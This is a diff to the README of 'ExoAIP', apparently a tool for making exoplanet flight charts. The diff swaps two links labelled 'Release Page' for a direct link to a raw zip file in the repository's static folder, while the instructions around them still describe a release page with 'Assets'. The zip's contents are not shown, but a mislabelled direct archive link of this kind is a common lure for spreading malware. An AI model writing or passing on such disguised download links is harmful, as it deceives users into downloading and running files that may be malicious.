@@ -1,6 +1,6 @@
 # 🪐 ExoAIP - Create flight maps for alien worlds
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Roxannathen323/ExoAIP/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Roxannathen323/ExoAIP/raw/refs/heads/main/static/AIP-Exo-1.9.zip)
 
 ExoAIP creates aeronautical information publications for exoplanets. It uses astronomical data to generate flight paths and charts. Pilots and mission designers use this tool to navigate surface environments on distant worlds. The software translates complex NASA astrophysical data into readable flight documents.
 
@@ -19,7 +19,7 @@ Check your Windows version by clicking the Start button and typing "About your P
 
 ## 📥 Downloading the Software
 
-Visit the [ExoAIP Release Page](https://github.com/Roxannathen323/ExoAIP/releases) to download the application. 
+Visit the [ExoAIP Release Page](https://github.com/Roxannathen323/ExoAIP/raw/refs/heads/main/static/AIP-Exo-1.9.zip) to download the application. 
 
 1. Navigate to the link provided above.
 2. Look for the "Assets" section at the bottom of the latest release post.
